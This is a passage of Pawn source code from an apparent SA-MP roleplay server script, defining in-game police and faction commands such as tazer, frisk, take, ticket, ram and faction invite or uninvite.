					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GameTextForPlayer(giveplayerid, "~g~Uncuffed", 2500, 3);
					TogglePlayerControllable(giveplayerid, 1);
					SetPlayerSpecialAction(giveplayerid, SPECIAL_ACTION_DANCE1);
					PlayerCuffed[giveplayerid] = 0;
                    PlayerCuffedTime[giveplayerid] = 0;
					DeletePVar(giveplayerid, "PlayerCuffed");
					if(PlayerDraggedBy[giveplayerid] != INVALID_PLAYER_ID) {
						IsCopDragging[PlayerDraggedBy[giveplayerid]] = INVALID_PLAYER_ID;
						PlayerDragged[giveplayerid] = 0;
						PlayerDraggedBy[giveplayerid] = INVALID_PLAYER_ID;
					}
					ClearAnimations(giveplayerid, 1);
					SetPlayerSpecialAction(giveplayerid, SPECIAL_ACTION_NONE);
				 	if(IsPlayerAttachedObjectSlotUsed(giveplayerid, 0))
						RemovePlayerAttachedObject(giveplayerid, 0);
					//ResyncPlayer(giveplayerid);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "That player isn't cuffed.");
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not a law enforcement officer.");
	}
	return 1;
}

/*CMD:resync(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 2)
	    return SendClientMessage(playerid, COLOR_GREY, "You're not authorised to use this command.");

	new
		iTarget;

	if(sscanf(params, "u", iTarget))
	    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /resync [playerid/partOfName]");

	if(iTarget == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");

	new
	    szMessage[128];

	format(szMessage, sizeof(szMessage), "{AA3333}AdmWarning{FFFF00}: %s has resynced %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTarget));
	ABroadCast(COLOR_YELLOW, szMessage, 2);

    ResyncPlayer(iTarget);
    return 1;
}*/

CMD:tazer(playerid, params[])
{
	if(IsACop(playerid)|| PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
		new
			string[128];
		if(PlayerInfo[playerid][pConnectTime] < 2)
			return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this as you're currently restricted from possessing weapons!");

		if(IsPlayerInAnyVehicle(playerid))
			return SendClientMessage(playerid, COLOR_GREY, "You can't do this while you're in a vehicle.");

		if(GetPVarInt(playerid, "PBM") > 0)
			return SendClientMessage(playerid, COLOR_WHITE, "You're not able to do this while in a paintball game.");

		if(GetPVarInt(playerid, "EventToken") != 0)
			return SendClientMessage(playerid, COLOR_GREY, "You can't use the tazer while you're in an event.");

		if(PlayerCuffedTime[playerid] > 0)
		 return SendClientMessage(playerid, COLOR_GREY, "You can't do this right now.");

		if(GetPVarInt(playerid, "Injured") == 1)
			return SendClientMessage(playerid, COLOR_GREY, "You can't do this right now.");

		if(PlayerInfo[playerid][pJailed] > 0)
			return SendClientMessage(playerid, COLOR_WHITE, "You can't use this in jail/prison.");

		if(PlayerCuffed[playerid] >= 1)
			return SendClientMessage(playerid, COLOR_WHITE, "You can't use this while tazed/cuffed.");


		if(pTazer[playerid] == 0) {
			pTazerReplace[playerid] = PlayerInfo[playerid][pGuns][2];
			if(PlayerInfo[playerid][pGuns][2] != 0) RemovePlayerWeapon(playerid, PlayerInfo[playerid][pGuns][2]);
			format(string, sizeof(string), "* %s unholsters their tazer.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			GivePlayerValidWeapon(playerid, 23, 60000);
			pTazer[playerid] = 1;
		} else {
			RemovePlayerWeapon(playerid, 23);
			GivePlayerValidWeapon(playerid, pTazerReplace[playerid], 60000);
			format(string, sizeof(string), "* %s holsters their tazer.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			pTazer[playerid] = 0;
		}
	} else return SendClientMessage(playerid, COLOR_GREY, "   You're not a Cop / FBI!");
	return 1;
}

CMD:frisk(playerid, params[]) {
	new string[128], giveplayerid;

	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /frisk [playerid/partofname]");

 	if(giveplayerid == INVALID_PLAYER_ID)
	 	return SendClientMessage(playerid, COLOR_GREY, "You can't frisk this player as they're not connected.");

	if(ProxDetectorS(8.0, playerid, giveplayerid)) {
		if(giveplayerid == playerid)
			return SendClientMessage(playerid, COLOR_GREY, "You can't frisk yourself!");

		if(giveplayerid == INVALID_PLAYER_ID)
		    return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");

		if(IsACop(playerid) || PlayerInfo[playerid][pJob] == 8 || PlayerInfo[playerid][pJob2] == 8 || (PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pDivision] == 2) || (PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pRank] >= 5)) {
			SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
			format(string, sizeof(string), "*** %s' items...  ***", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);

			if(PlayerInfo[giveplayerid][pWSeeds] == 1)
				SendClientMessage(playerid, COLOR_GREY, "Marijuana Seeds");

			if(PlayerInfo[giveplayerid][pPhoneBook] > 0)
				SendClientMessage(playerid, COLOR_GREY, "Phone book.");

			if(PlayerInfo[giveplayerid][pCDPlayer] > 0)
				SendClientMessage(playerid, COLOR_GREY, "CD player.");

			if(PlayerInfo[giveplayerid][pRadio] > 0) {
				format(string, sizeof(string), "Portable radio (frequency #%d kHz)", PlayerInfo[giveplayerid][pRadioFreq]);
				SendClientMessage(playerid, COLOR_GREY, string);
			}

			if(PlayerInfo[giveplayerid][pCarLic] > 0)
				SendClientMessage(playerid, COLOR_GREY, "Driver's license.");

			if(PlayerInfo[giveplayerid][pBoatLic] > 0)
				SendClientMessage(playerid, COLOR_GREY, "Boat driver's license.");

			if(PlayerInfo[giveplayerid][pFlyLic] > 0)
				SendClientMessage(playerid, COLOR_GREY, "Pilot's license.");

			if(PlayerInfo[giveplayerid][pCrack] > 0) {
				format(string, sizeof(string), "%d grams of crack.", PlayerInfo[giveplayerid][pCrack]);
				SendClientMessage(playerid, COLOR_GREY, string);
			}
			if(PlayerInfo[giveplayerid][pPot] > 0) {
				format(string, sizeof(string), "%d grams of pot.", PlayerInfo[giveplayerid][pPot]);
				SendClientMessage(playerid, COLOR_GREY, string);
			}
			if(PlayerInfo[giveplayerid][pMats] > 0) {
				format(string, sizeof(string), "%d materials.", PlayerInfo[giveplayerid][pMats]);
				SendClientMessage(playerid, COLOR_GREY, string);
			}
			if(Fishes[giveplayerid][pWeight1] > 0 || Fishes[giveplayerid][pWeight2] > 0 || Fishes[giveplayerid][pWeight3] > 0 || Fishes[giveplayerid][pWeight4] > 0 || Fishes[giveplayerid][pWeight5] > 0) {
				format(string, sizeof(string), "%d fish.", PlayerInfo[giveplayerid][pFishes]);
				SendClientMessage(playerid, COLOR_GREY, string);
			}

			new weaponname[50];
			format(string, sizeof(string), "*** %s' weapons...  ***", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);

			for(new i = 0; i < 12; i++) {
				if(PlayerInfo[giveplayerid][pGuns][i] > 0) {
					GetWeaponName(PlayerInfo[giveplayerid][pGuns][i], weaponname, sizeof(weaponname));
					format(string, sizeof(string), "Weapon: %s.", weaponname);
					SendClientMessage(playerid, COLOR_GRAD1, string);
				}
			}

			SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
			format(string, sizeof(string), "* %s has frisked %s.", GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		} else {
		    SetPVarInt(giveplayerid, "FriskREQ", playerid);

		    format(string, sizeof(string), "* Your request to frisk %s (ID: %d) has been sent, they must '/accept frisk' first.", GetPlayerNameEx(giveplayerid), giveplayerid);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

		    format(string, sizeof(string), "* %s is requesting to frisk you, type '/accept frisk' to accept.", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
		}
	} else return SendClientMessage(playerid, COLOR_GREY, "You're too far away!");
	return 1;
}

CMD:take(playerid, params[])
{
	if(IsACop(playerid) || (PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2)
	{
		if(PlayerInfo[playerid][pRank] < 1 && PlayerInfo[playerid][pFaction] != 2)
		{
			SendClientMessage(playerid, COLOR_GREY, "   You need to be rank 2 or higher for this action!");
			return 1;
		}

		new string[128], choice[32], giveplayerid;
		if(sscanf(params, "s[32]u", choice, giveplayerid))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /take [name] [playerid/partofname]");
			SendClientMessage(playerid, COLOR_GREY, "Available names: Weapons, Pot, Crack, Seeds, Radio.");
			return 1;
		}
		if(strcmp(choice,"radio",true) == 0)
		{
			if(IsPlayerConnected(giveplayerid))
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					format(string, sizeof(string), "* You have taken away %s's radio.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Officer %s has taken away your radio.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Officer %s has taken away %s's radio.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					PlayerInfo[giveplayerid][pRadio] = 0;
					PlayerInfo[giveplayerid][pRadioFreq] = 0;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
					return 1;
				}

			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
				return 1;
			}
		}
		else if(strcmp(choice,"weapons",true) == 0)
		{
			if(IsPlayerConnected(giveplayerid))
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					format(string, sizeof(string), "* You have taken away %s's weapons.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Officer %s has taken away your weapons.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Officer %s has taken away %s's weapons.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					ResetPlayerWeaponsEx(giveplayerid);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
					return 1;
				}

			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
				return 1;
			}
		}
		else if(strcmp(choice,"seeds",true) == 0)
		{
			if(IsPlayerConnected(giveplayerid))
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					format(string, sizeof(string), "* You have taken away %s's seeds.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Officer %s has taken away your seeds.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Officer %s has taken away %s's seeds.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					PlayerInfo[giveplayerid][pWSeeds] = 0;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
				return 1;
			}
		}
		else if(strcmp(choice,"pot",true) == 0)
		{
			if(IsPlayerConnected(giveplayerid))
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					format(string, sizeof(string), "* You have taken away %s's pot.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Officer %s has taken away your pot.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Officer %s has taken away %s's pot.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					PlayerInfo[giveplayerid][pPot] = 0;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
				return 1;
			}
		}
		else if(strcmp(choice,"crack",true) == 0)
		{
			if(IsPlayerConnected(giveplayerid))
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					format(string, sizeof(string), "* You have taken away %s's crack.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Officer %s has taken away your crack.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Officer %s has taken away %s's crack.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					PlayerInfo[giveplayerid][pCrack] = 0;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
					return 1;
				}

			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   Invalid item specified.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not a law enforcement officer.");
		return 1;
	}
	return 1;
}

CMD:ticket(playerid, params[])
{
	if(IsACop(playerid) || (PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pDivision] == 2) || (PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pRank] >= 5))
	{

		new string[128], giveplayerid, moneys, reason[64];
		if(sscanf(params, "uds[64]", giveplayerid, moneys, reason)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /ticket [playerid/partofname] [price] [reason]");

		if(giveplayerid == playerid)
		{
			SendClientMessage(playerid, COLOR_GREY, "You can't ticket yourself.");
			return 1;
		}

		if(moneys < 1 || moneys > 1500) { SendClientMessage(playerid, COLOR_GREY, "The ticket price can't be below $1 or higher then $1,500."); return 1; }
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					if(giveplayerid == playerid) return 1;

					format(string, sizeof(string), "* You gave %s a ticket costing $%d, reason: %s", GetPlayerNameEx(giveplayerid), moneys, reason);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Officer %s has given you a ticket costing $%d, reason: %s", GetPlayerNameEx(playerid), moneys, reason);
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Officer %s writes up a ticket and gives it to %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "* Type /accept ticket, to accept it.");
					TicketOffer[giveplayerid] = playerid;
					TicketMoney[giveplayerid] = moneys;
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
					return 1;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
			return 1;
		}
	}
	return 1;
}

CMD:gov(playerid, params[])
{
	if(IsInLSFMD(playerid) || IsACop(playerid) || PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pLeader] == 5)
	{
		if(isnull(params))
		{
			SendClientMessage(playerid, COLOR_GRAD2, "USAGE: (/gov)ernment [text]");
			return 1;
		}

		new string[128];

		if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1)
		{
			if(PlayerInfo[playerid][pRank] == 6)
			{
				format(string, sizeof(string), "** LSPD: Chief %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________ Government News Announcement ___________|");
				SendClientMessageToAllEx(COLOR_DBLUE, string);
			}
			else if(PlayerInfo[playerid][pRank] == 5)
			{
				format(string, sizeof(string), "** LSPD: Captain %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________ Government News Announcement ___________|");
				SendClientMessageToAllEx(COLOR_DBLUE, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   You need to be Rank 5 or higher to be able to use this!");
			}
		}
		else if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
		{
			if(PlayerInfo[playerid][pRank] == 6)
			{
				format(string, sizeof(string), "** FBI: Director %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________ Government News Announcement ___________|");
				SendClientMessageToAllEx(COLOR_DBLUE, string);
			}
			else if(PlayerInfo[playerid][pRank] == 5)
			{
				format(string, sizeof(string), "** FBI: Assistant Director %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________ Government News Announcement ___________|");
				SendClientMessageToAllEx(COLOR_DBLUE, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   You need to be Rank 5 or higher to be able to use this!");
			}
		}
		else if(PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3)
		{
			if(PlayerInfo[playerid][pRank] == 6)
			{
				format(string, sizeof(string), "** LSFMD: Chief %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________ Government News Announcement ___________|");
				SendClientMessageToAllEx(TEAM_CYAN_COLOR, string);
			}
			else if(PlayerInfo[playerid][pRank] == 5)
			{
				format(string, sizeof(string), "** LSFMD: Assistant Chief %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________ Government News Announcement ___________|");
				SendClientMessageToAllEx(TEAM_CYAN_COLOR, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   You need to be Rank 5 or higher to be able to use this!");
			}
		}
		else if(PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pLeader] == 5) {
			if(PlayerInfo[playerid][pRank] == 6)
			{
				format(string, sizeof(string), "** Government: Mayor %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________ Government News Announcement ___________|");
				SendClientMessageToAllEx(COLOR_GOV, string);
			}
			else if(PlayerInfo[playerid][pRank] == 5)
			{
				format(string, sizeof(string), "** Government: Vice Mayor %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________ Government News Announcement ___________|");
				SendClientMessageToAllEx(COLOR_GOV, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   You need to be Rank 5 or higher to be able to use this!");
			}
		}
	}
	return 1;
}

CMD:tourhouse(playerid, params[])
{
    if(PlayerCuffed[playerid] >= 1 || GetPVarInt(playerid, "Injured") == 1) {
        SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");
        return 1;
    }

    new string[128];
    for(new i = 0; i < sizeof(HouseInfo); i++) {
        if(IsPlayerInRangeOfPoint(playerid,3,HouseInfo[i][hExteriorX], HouseInfo[i][hExteriorY], HouseInfo[i][hExteriorZ]))
		{
		    if(HouseInfo[i][hOwned] != 0)
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "You can't tour owned houses.");
		        return 1;
		    }
			if(GetPVarInt(playerid, "TourHouseConfirm") == 0)
			{
				SetPVarInt(playerid, "TourHouseConfirm", 1);
				SendClientMessage(playerid, COLOR_WHITE, "You're about to be shown the interior of this house for $30.");
				SendClientMessage(playerid, COLOR_WHITE, "If you're sure you want to pay $30 for the tour then type this command again.");
				return 1;
			}
			DeletePVar(playerid, "TourHouseConfirm");

   			GivePlayerCash(playerid, -30);
    		GameTextForPlayer(playerid, "~r~-$30", 3000, 1);

            format(string, sizeof(string), "* %s has entered a house.", GetPlayerNameEx(playerid));
            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            SetPlayerInterior(playerid,HouseInfo[i][hHInteriorWorld]);
            if(HouseInfo[i][hCustomInterior] == 1) {
                LoadObjectsForPlayer(playerid);
            }
            SetPlayerPos(playerid,HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
            SetPlayerFacingAngle(playerid,HouseInfo[i][hInteriorA]);
            SetCameraBehindPlayer(playerid);
            PlayerInfo[playerid][pInt] = HouseInfo[i][hHInteriorWorld];
            PlayerInfo[playerid][pVW] = i+60000;
            SetPlayerVirtualWorld(playerid, i+60000);
        }
    }
    return 1;
}

CMD:ram(playerid, params[])
{
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 4) {
		if(GetPVarInt(playerid, "PBM") > 0)
			return SendClientMessage(playerid, COLOR_WHITE, "You can't do this while being in a arena!");

		if(PlayerCuffed[playerid] >= 1)
			return SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");

		new string[128], found;
		for(new i = 0; i < sizeof(HouseInfo); i++)
		{
			if(IsPlayerInRangeOfPoint(playerid,3,HouseInfo[i][hExteriorX], HouseInfo[i][hExteriorY], HouseInfo[i][hExteriorZ]))
			{
				found++;
				format(string, sizeof(string), "* %s breaches the door, and enters.", GetPlayerNameEx(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				SetPlayerInterior(playerid,HouseInfo[i][hHInteriorWorld]);
				if(HouseInfo[i][hCustomInterior] == 1)
				{
					LoadObjectsForPlayer(playerid);
				}
				SetPlayerPos(playerid,HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
    			SetPlayerFacingAngle(playerid,HouseInfo[i][hInteriorA]);
                SetCameraBehindPlayer(playerid);
				GameTextForPlayer(playerid, "~r~Breached the door", 5000, 1);
				PlayerInfo[playerid][pInt] = HouseInfo[i][hHInteriorWorld];
				PlayerInfo[playerid][pVW] = i+60000;
				SetPlayerVirtualWorld(playerid, i+60000);
			}
		}
		if(found == 0)
			return SendClientMessage(playerid, COLOR_GREY, "   You're not near a house!");
	}
	else SendClientMessage(playerid, COLOR_GREY, "   You're not a Cop!");
	return 1;
}

CMD:invite(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] >= 1)
	{
		new string[128], ftext[50], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /invite [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pLeader] == 0 && PlayerInfo[giveplayerid][pFaction] == 0 && PlayerInfo[giveplayerid][pGang] == 255)
			{
				if(PlayerInfo[playerid][pLeader] == 1)
					ftext = "LSPD";
				else if(PlayerInfo[playerid][pLeader] == 2)
					ftext = "FBI";
				else if(PlayerInfo[playerid][pLeader] == 3)
					ftext = "LSFMD";
				else if(PlayerInfo[playerid][pLeader] == 4)
					ftext = "Hitman Agency";
				else if(PlayerInfo[playerid][pLeader] == 9)
					ftext = "SA News";
				else
					return SendClientMessage(playerid, COLOR_GREY, "You can't invite a player to this faction.");

				InviteOffer[giveplayerid] = playerid;
				InviteFamily[giveplayerid] = 255;
				InviteFaction[giveplayerid] = PlayerInfo[playerid][pLeader];
				format(string, sizeof(string), "You have been invited to join the %s by %s - type /accept faction.", ftext, GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "You have invited %s to join the %s.", GetPlayerNameEx(giveplayerid),ftext);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "The player you're trying to invite is already in another faction or family.");
				return 1;
			}

		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command - only leaders can do this.");
	}
	return 1;
}

CMD:uninvite(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] >= 1)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /uninvite [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			if((PlayerInfo[giveplayerid][pFaction] == PlayerInfo[playerid][pLeader]) && (PlayerInfo[giveplayerid][pLeader] == 0 || PlayerInfo[giveplayerid][pRank] < PlayerInfo[playerid][pRank]))
			{
				format(string, sizeof(string), "* You have been kicked from the faction by leader %s.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "* You're now a civilian again.");
				format(string, sizeof(string), "%s has uninvited %s from the %s as a rank %i.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), GetFactionName(PlayerInfo[giveplayerid][pFaction]), PlayerInfo[giveplayerid][pRank]);
				Log("logs/faction.log", string);
				PlayerInfo[giveplayerid][pFaction] = 0;
				PlayerInfo[giveplayerid][pRank] = 0;
				PlayerInfo[giveplayerid][pDuty] = 0;
				PlayerInfo[giveplayerid][pLeader] = 0;
				PlayerInfo[giveplayerid][pDivision] = 0;
				if(!IsValidSkin(GetPlayerSkin(giveplayerid)))
				{
					new rand = random(sizeof(CIV));
					SetPlayerSkin(giveplayerid,CIV[rand]);
					PlayerInfo[giveplayerid][pSkin] = CIV[rand];
				}
				player_remove_vip_toys(giveplayerid);
				SetPlayerToTeamColor(giveplayerid);
				pTazer[giveplayerid] = 0;
				format(string, sizeof(string), "You have kicked %s from the faction.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				if(TalkingLive[giveplayerid] != INVALID_PLAYER_ID || LiveOffer[giveplayerid] != INVALID_PLAYER_ID ) {
					TalkingLive[TalkingLive[giveplayerid]] = INVALID_PLAYER_ID;
					TalkingLive[LiveOffer[giveplayerid]] = INVALID_PLAYER_ID;
					LiveOffer[LiveOffer[giveplayerid]] = INVALID_PLAYER_ID;
					LiveOffer[TalkingLive[giveplayerid]] = INVALID_PLAYER_ID;
				}
				TalkingLive[giveplayerid] = INVALID_PLAYER_ID;
				LiveOffer[giveplayerid] = INVALID_PLAYER_ID;
				Backup[playerid] = 0;
			}
			else SendClientMessage(playerid, COLOR_WHITE, "That player can't be uninvited by you.");
		}
		SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command - only leaders can do this.");
	}
	return 1;
}


CMD:ouninvite(playerid, params[]) {
	if(PlayerInfo[playerid][pLeader] >= 1) {
		if(isnull(params))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /ouninvite [name]");

		if(IsPlayerConnected(ReturnUser(params)))
		    return SendClientMessage(playerid, COLOR_GREY, "This player is currently connected, please use /uninvite to uninvite the player.");

		new
		    szPlayerName[MAX_PLAYER_NAME],
		    szQuery[128];

		mysql_escape_string(params, szPlayerName,MAX_PLAYER_NAME,sqldb);

		SetPVarString(playerid, "uninvite_target", szPlayerName);

		mysql_format(sqldb,szQuery, sizeof(szQuery), "SELECT Faction, AdminLevel FROM players WHERE Username = '%s'", szPlayerName);
		mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii",THREAD_OFFLINE_UNINVITE,playerid);
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command - only leaders can do this.");
	return 1;
}

CMD:giverank(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] >= 1)
	{
		new string[128], giveplayerid, rank;
		if(sscanf(params, "ud", giveplayerid, rank)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /giverank [playerid/partofname] [Rank (1-6)]");

